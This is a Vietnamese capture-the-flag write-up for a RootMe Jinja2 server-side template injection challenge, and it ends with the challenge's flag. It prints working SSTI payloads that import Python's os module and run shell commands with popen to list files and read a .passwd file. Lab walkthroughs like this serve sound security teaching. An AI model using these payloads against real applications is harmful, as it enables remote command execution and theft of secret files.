Link refer: https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/#server-side-template-injections

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/7c09a5eb-df93-42f6-9b87-065a872b4e41)

Trong các input thì phần content có thể inject được

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/a8473bd9-2fae-4f8e-b9c0-3d21150675fd)

Sử dụng payload ```{{self._TemplateReference__context.cycler.__init__.__globals__.os}}```
=> import library os

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/12b4b361-0e35-42dd-b436-3003a003e8db)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/d7d5869d-c1c8-4866-934e-f68b4b6ddeee)

Sử dụng payload
```{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls%20-a').read()}}```. 
Kí tự ```%20``` thay thế cho nhưng khoảng trắng 

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/deeced39-c230-4392-88eb-87032e4a560d)

Thấy được nơi chứa flag là .passwd. Sử dụng payload ```{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20.passwd').read()}}```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/77d7a603-e9a6-4cec-9eaf-7ce85a0e20b5)

=> Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!
